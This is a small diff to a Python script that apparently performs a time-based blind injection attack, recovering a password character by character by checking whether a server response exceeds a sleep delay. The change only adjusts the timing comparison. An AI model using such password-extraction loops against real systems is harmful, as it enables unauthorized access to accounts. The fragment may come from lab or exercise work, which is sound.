@@ -71,7 +71,7 @@ for char in possible_chars:
     }
     response = session.post(URL, data=data)
     # if the response time exceeded the sleep time, then the character is in the password
-    if response.elapsed.total_seconds() > SLEEP_SECONDS:
+    if response.elapsed.total_seconds() >= SLEEP_SECONDS:
         password_chars += char
         print(f'password_chars: {password_chars}', end='\r')
 print('\n')
